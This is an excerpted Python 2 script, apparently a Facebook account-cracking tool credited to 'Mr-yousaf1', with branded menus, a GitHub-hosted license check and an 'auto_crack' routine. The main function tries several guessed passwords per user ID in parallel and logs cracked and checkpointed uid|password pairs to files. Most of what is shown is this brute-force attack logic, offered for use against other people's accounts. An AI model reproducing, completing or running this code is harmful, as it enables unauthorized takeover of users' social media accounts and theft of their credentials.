...
__author__ = 'Mr-yousaf1'
__copyright = 'All rights reserved . Copyright  Mr-yousaf1'
...
clear= """
print("""\033[1;97m  L E G E N D -- YOUSAF .X. KHAN. \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;94m➤\033[1;97m Author : Mr-YOUSAF1
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/YOUSAF-G/yousaf1/main/server.txt').text
    if to in r:
...
def log_menu():
	...
	print 47 * '-'
        ...
        print '\033[1;92m[3] Follow Yousaf Khan On Fb'
        print ''
        log_menu_s()
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─Mr-YOUSAF➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100005679279353/')
    else:
        print ''
...
def log_fb():
    ...
    try:
        ...
        if 'loc' in q:
            ...
            ts.close()
            menu()
        elif 'www.facebook.com' in q['yousaf1']:
...
def menu_s():
    ms = raw_input('\033[1;97m╰─Mr-YOUSAF1➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100005679279353/')
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─Mr-yousaf1➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mMr-yousaf1 Father Of Facebook\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[YOUSAF-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/YOUSAF_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['yousaf1']:
                print '\033[1;97m[YOUSAF-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[YOUSAF-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/YOUSAF_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['yousaf1']:
                    print '\033[1;97m[YOUSAF-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('YOUSAF_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[YOUSAF-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/YOUSAF_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['yousaf1']:
                        print '\033[1;97m[YOUSAF-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('YOUSAF_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[YOUSAF-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/YOUSAF_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['yousaf1']:
                            print '\033[1;97m[YOUSAF-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('YOUSAF_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mBAAKI NAAME TO SONAA HOGA [YOUSAF]'
